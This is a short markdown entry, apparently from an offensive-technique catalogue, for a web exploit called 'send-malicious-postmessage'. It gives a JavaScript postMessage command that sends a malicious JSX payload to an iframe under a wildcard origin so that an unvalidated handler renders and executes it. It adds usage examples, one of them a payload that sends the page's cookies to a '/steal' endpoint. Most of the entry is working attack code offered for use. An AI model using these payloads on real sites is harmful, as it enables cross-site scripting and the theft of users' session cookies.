---
data: >-
  ifrm.contentWindow.postMessage({ast:{code:"<img src='x' onError={() =>
  alert(document.location)} />;"}},'*')
tags:
  - xss
  - postmessage
  - exploit
type: command
executor: javascript
platforms:
  - Web
id: 4c1053ea-5636-47c4-ba0a-bc2df419f54a
created_at: '2025-12-14T03:16:02.495Z'
updated_at: '2025-12-14T03:16:02.495Z'
verified: false
validated: true
submitted: true
---
# send-malicious-postmessage

## Command

```javascript
ifrm.contentWindow.postMessage({ast:{code:"<img src='x' onError={() => alert(document.location)} />;"}},'*')
```

## Description

This JavaScript command sends a postMessage to an iframe's contentWindow (assuming 'ifrm' is the iframe element ID), carrying a malicious payload in the ast.code field as JSX. The '*' targetOrigin bypasses origin checks, exploiting unvalidated handlers to inject and execute code via React rendering.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| {ast:{code:"..."}} | Payload data with malicious JSX in ast.code | Yes |
| '*' | Target origin (wildcard allows any source) | Yes |

## Examples

### Basic Usage

```javascript
document.getElementById('ifrm').contentWindow.postMessage({ast:{code:"alert('XSS')"}}, '*');
```

### Advanced Usage

```javascript
ifrm.contentWindow.postMessage({ast:{code:"<script>fetch('/steal?cookie=' + document.cookie)</script>"}}, '*');
```

## Expected Output

Triggers XSS: Renders the JSX, executes onError or similar, showing an alert with document.location or performing other actions like data exfiltration.

## Related

- [[Related Procedure]]
